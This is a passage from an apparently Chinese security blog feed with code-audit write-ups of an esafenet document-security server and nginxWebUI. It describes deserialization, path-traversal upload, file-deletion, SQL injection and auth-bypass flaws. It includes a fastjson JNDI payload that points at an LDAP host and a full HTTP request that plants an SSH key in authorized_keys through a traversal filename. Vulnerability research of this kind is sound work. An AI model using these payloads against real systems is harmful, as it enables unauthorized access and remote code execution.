(m1)-[:CALL]-(m2:Method &#123;NAME:<span class="hljs-string">&quot;fromXML&quot;</span>&#125;) <br>RETURN path<br></code></pre></td></tr></table></figure><p><img src="image-20231222115957326.png" alt="image-20231222115957326"></p><p>这样我们就得到只调用一次就出发漏洞。可以看到很多点。</p><p>找其中一个路由 &#x2F;CDGServer3&#x2F;UserLoginOutService1</p><p><img src="image-20231222203249063.png" alt="image-20231222203249063"></p><p>在web.xml找对应的可以进行分析<img src="image-20231222120846744.png" alt="image-20231222120846744"></p><p>对应 com.esafenet.servlet.service.UserLoginOutService1</p><p><img src="../../../../CDGServer3/image-20231220110956649.png" alt="image-20231220110956649"></p><p>从request获取，然后fromXML。</p><p>所有重点就是看ServiceUtil.getXMLFromRequest(), 怎么处理。</p><p><img src="image-20231220111054322.png" alt="image-20231220111054322"></p><p><img src="image-20231220111148015.png" alt="image-20231220111148015"></p><p>它会先getXMLFromRequest0获取流转化string，然后调用decodeString解密。</p><p><img src="image-20231220111230823.png" alt="image-20231220111230823"></p><p>对应的解密算法。</p><p><img src="image-20231220111247987.png" alt="image-20231220111247987"></p><p>密钥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] abyte0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;-<span class="hljs-number">21</span>, -<span class="hljs-number">112</span>, <span class="hljs-number">90</span>, -<span class="hljs-number">68</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">85</span>, -<span class="hljs-number">86</span>, -<span class="hljs-number">21</span>, -<span class="hljs-number">112</span>, <span class="hljs-number">90</span>, -<span class="hljs-number">68</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">85</span>, -<span class="hljs-number">86</span>&#125;;<br><br></code></pre></td></tr></table></figure><p>所以找对应的加密算法就可以。</p><p><img src="image-20231220111407884.png" alt="image-20231220111407884"></p><p>对应的加密算法。剩下就是xstreem的漏洞流程。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231220113409891.png" alt="image-20231220113409891"></p><p><img src="image-20231220113437458.png" alt="image-20231220113437458"></p><h2 id="0x03-（nday）文件上传-1"><a href="#0x03-（nday）文件上传-1" class="headerlink" title="0x03 （nday）文件上传 -1"></a>0x03 （nday）文件上传 -1</h2><h3 id="DecryptApplicationService2-uoload"><a href="#DecryptApplicationService2-uoload" class="headerlink" title="DecryptApplicationService2_uoload"></a>DecryptApplicationService2_uoload</h3><p>com.esafenet.servlet.service.smartsec.DecryptApplicationService2</p><p><img src="image-20231222174545123.png" alt="image-20231222174545123"></p><p><img src="image-20231222174629936.png" alt="image-20231222174629936"></p><p>没什么好分析的，从获取fileId然后拼接路径，获取iStream直接写入。</p><p>fileId没有过滤，可以目录穿越写入导致rce.</p><h2 id="0x04（nday）文件上传-2"><a href="#0x04（nday）文件上传-2" class="headerlink" title="0x04（nday）文件上传 -2"></a>0x04（nday）文件上传 -2</h2><h3 id="UploadFileFromClientServiceForClient-upload"><a href="#UploadFileFromClientServiceForClient-upload" class="headerlink" title="UploadFileFromClientServiceForClient_upload"></a>UploadFileFromClientServiceForClient_upload</h3><p><img src="image-20231222175051914.png" alt="image-20231222175051914"></p><p><img src="image-20231222175126611.png" alt="image-20231222175126611"></p><p>解密value_code</p><p><img src="image-20231222175227500.png" alt="image-20231222175227500"></p><p>在下面进行判断</p><p><img src="image-20231222175404289.png" alt="image-20231222175404289"></p><p>然后可控fileName, InputStream从req获取，最后写入，同理目录穿越写入。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><img src="image-20231222175836126.png" alt="image-20231222175836126"></p><h2 id="0x05-fastjson"><a href="#0x05-fastjson" class="headerlink" title="0x05 fastjson"></a>0x05 fastjson</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/dataflowconf/</span>saveConfig.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.dataconf</span><span class="hljs-selector-class">.controller</span>.saveConfig<br></code></pre></td></tr></table></figure><p><img src="image-20231227004844929.png" alt="image-20231227004844929"></p><p><img src="image-20231227004959240.png" alt="image-20231227004959240"></p><p><img src="image-20231227005043898.png" alt="image-20231227005043898"></p><p>我是大彩笔</p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><p>直接使用1.2.47的payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;e&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;f&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://10.211.55.2:80/Object&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="0x06-反序列化"><a href="#0x06-反序列化" class="headerlink" title="0x06 反序列化"></a>0x06 反序列化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dlpPolicy/importPolicy.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.policy</span><span class="hljs-selector-class">.controller</span>.importPolicy<br></code></pre></td></tr></table></figure><p><img src="image-20231227005119022.png" alt="image-20231227005119022"></p><p><img src="image-20231227005219052.png" alt="image-20231227005219052"></p><p>从file获取流加密，然后转对象</p><p><img src="image-20231227005737683.png" alt="image-20231227005737683"></p><p><img src="image-20231227005640532.png" alt="image-20231227005640532"></p><p>加密方法</p><p><img src="image-20231227005303455.png" alt="image-20231227005303455"></p><p>然后进行反序列化。</p><p>很明确了，就是构造加密后的byte为反序列化数据，然后当file上传，后段会先加密file，然后进行反序列化。</p><p>需要自己实现对应的解密方法。</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231227015928700.png" alt="image-20231227015928700"></p><h2 id="0x07-反射调用"><a href="#0x07-反射调用" class="headerlink" title="0x07 反射调用"></a>0x07 反射调用</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/dataconf/g</span>etDataConfInfo.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.dataconf</span><span class="hljs-selector-class">.controller</span>.DataConfController<br></code></pre></td></tr></table></figure><p><img src="image-20231227155316597.png" alt="image-20231227155316597"></p><p><img src="image-20231227134859229-3663575.png" alt="image-20231227134859229"></p><p>反射调用</p><h2 id="0x09-sql注入"><a href="#0x09-sql注入" class="headerlink" title="0x09 sql注入"></a>0x09 sql注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dlpPolicy/exportPolicy.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.policy</span><span class="hljs-selector-class">.controller</span>.DlpPolicyController<br></code></pre></td></tr></table></figure><p><img src="image-20231227153543499.png" alt="image-20231227153543499"></p><p><img src="image-20231227153549180.png" alt="image-20231227153549180"></p><p><img src="image-20231227153554511.png" alt="image-20231227153554511"></p><p>看见很多都是直接拼接，就不一一找了</p><h2 id="0x010-后语"><a href="#0x010-后语" class="headerlink" title="0x010 后语"></a>0x010 后语</h2><p>​练手不错。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginxWebUI代码审计</title>
    <link href="/2023/12/14/nginxWebUI%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/12/14/nginxWebUI%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传 (&lt;&#x3D;3.7.8)"></a>0x01 文件上传 (&lt;&#x3D;3.7.8)</h2><p>接口&#x2F;adminPage&#x2F;main&#x2F;upload</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;MainController.java#upload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;/adminPage/main/upload&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">upload</span><span class="hljs-params">(Context context, UploadedFile file)</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">File</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(FileUtil.getTmpDir() + <span class="hljs-string">&quot;/&quot;</span> + file.getName());<br>file.transferTo(temp);<br><br><span class="hljs-keyword">return</span> renderSuccess(temp.getPath().replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (IllegalStateException | IOException e) &#123;<br>logger.error(e.getMessage(), e);<br>&#125;<br><br><span class="hljs-keyword">return</span> renderError();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越到ssh目录，也没有对后缀名限制，可以进行写公钥获取shell。然后把路径“\\”替换“&#x2F;”。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>ssh-keygen -t rsa -f id_rsa</p><p>然后上传</p><p><img src="image-20231122173930609.png" alt="image-20231122173930609"></p><p>可以看到成功上传</p><p><img src="image-20231122174241618.png" alt="image-20231122174241618"></p><p>可以看到成功登陆。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/main/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>805<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZfrhKJObI9gpzcfk<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/adminPage/www<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1677576503; _jpanonym=&quot;ZWMwM2YzYmEyY2ZiZDFhODVkODkwYmNkMGUxNzU2ZGUjMTY4MzE3NDg1Mzg5NyMzMTUzNjAwMCNZVEZoWWpFNU5XSmpaakE1TkRJek5UaGxNelF4WWprME5qa3lNekZqWkdJPQ==&quot;; Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a=1683170841,1683202635; SOLONID=5ef99bb26ca845b5b3e528f215e802b4; Hm_lvt_8acef669ea66f479854ecd328d1f348f=1700642329; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1700643843<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;../../../../../../../Users/username/.ssh/authorized_keys&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiI95LRyBLW2By5/KuuMm8QBicakTVsGcQGTjkhHTkn5wCkmC9j4Bt1IrM3AGuGZALe/FJMG3EFsnps2usFNgNaoC0qMJ7agjAbLt4BTC4sqlhKjzGEjTU3qvT1jqa/icjF5dOjA/<span class="hljs-number">0</span>B2o3h/<span class="hljs-number">0</span>M1kT6vcihSHELEcVYi13d8wUPqugd+<span class="hljs-number">5</span>uvZpy0giXQNdimZ6GnstBKL+GT9Pptf6ruLZVQvXvhDPMaeLD7/eU49MxVJG0LBBcXcppLYjrUPLVeqiq7kulIkfhHWQZpk4kUqjAtpLqNNhBupQaCekhaq9dJzPFRR6rV9SSAuytz2XEYqGrxm1ywIMd0rX6CsslQGCrPSyFk3zrY5knkOq908hyO6l2B+YPLf0CkmTbFv/RvQgIBDXUP5uWd8vfzjevXicIKNnHOIQR2PKM0bzPKKCkcH0sxpcuAHU+hL1qoX6J/<span class="hljs-number">2</span>HusfZWzifCYkna0iJewQLYT06MUYy1L7AD94SEVxCeZi1fFq/K3dnlvSp5uXv2jbdc= snake@snakedeMac-mini.loca</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><h2 id="0x02-任意文件删除"><a href="#0x02-任意文件删除" class="headerlink" title="0x02 任意文件删除 (&lt;&#x3D;3.7.8)"></a>0x02 任意文件删除 (&lt;&#x3D;3.7.8)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;ExportController.java#dataImport()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(value = &quot;dataImport&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dataImport</span><span class="hljs-params">(UploadedFile file, Context context)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>   <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(homeConfig.home + <span class="hljs-string">&quot;temp&quot;</span> + File.separator + file.getName());<br>      FileUtil.mkdir(tempFile.getParentFile());<br>      file.transferTo(tempFile);<br>      <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> FileUtil.readString(tempFile, StandardCharsets.UTF_8);<br>      tempFile.delete();<br><br>      <span class="hljs-type">AsycPack</span> <span class="hljs-variable">asycPack</span> <span class="hljs-operator">=</span> JSONUtil.toBean(json, AsycPack.class);<br>      confService.setAsycPack(asycPack);<br>      <br>      <span class="hljs-comment">// 导入证书</span><br>      <span class="hljs-keyword">if</span> (asycPack.getCertList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), Cert.class);<br>         sqlHelper.insertAll(asycPack.getCertList());<br>      &#125;<br>      <span class="hljs-keyword">if</span> (asycPack.getCertCodeList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), CertCode.class);<br>         sqlHelper.insertAll(asycPack.getCertCodeList());<br>      &#125;<br>      <br>      certService.writeAcmeZipBase64(asycPack.getAcmeZip());<br>   &#125;<br>   context.redirect(<span class="hljs-string">&quot;/adminPage/export?over=true&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越，也没有对后缀名限制，它先上传文件，然后从里面读，紧接着删除文件，只要控制传入文件名导致任意文件删除。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123002900589.png" alt="image-20231123002900589"></p><p>创建hookdd</p><p>构造数据包</p><p><img src="image-20231123002959116.png" alt="image-20231123002959116"></p><p><img src="image-20231123003017749.png" alt="image-20231123003017749"></p><p>完成删除</p><h2 id="0x03-Admin-注入绕过认证-全版本"><a href="#0x03-Admin-注入绕过认证-全版本" class="headerlink" title="0x03 Admin 注入绕过认证 (全版本)"></a>0x03 Admin 注入绕过认证 (全版本)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java#changePassOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;changePassOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><br>adminService.changePassOver(admin);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><span class="hljs-keyword">if</span> (admin.getAuth()) &#123;<br><span class="hljs-type">Admin</span> <span class="hljs-variable">adminOrg</span> <span class="hljs-operator">=</span> sqlHelper.findById(admin.getId(), Admin.class);<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(adminOrg.getKey())) &#123;<br>admin.setKey(authUtils.makeKey());<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setKey(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(admin.getPass())) &#123;<br>admin.setPass(EncodePassUtils.encode(admin.getPass()));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setPass(<span class="hljs-literal">null</span>);<br>&#125;<br>sqlHelper.updateById(admin);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里也是对admin.getId()判断，然后来改密码。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>以上两个路由都接收的Admin admin，</p><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含了自动登录key，autoKey。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;LoginController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 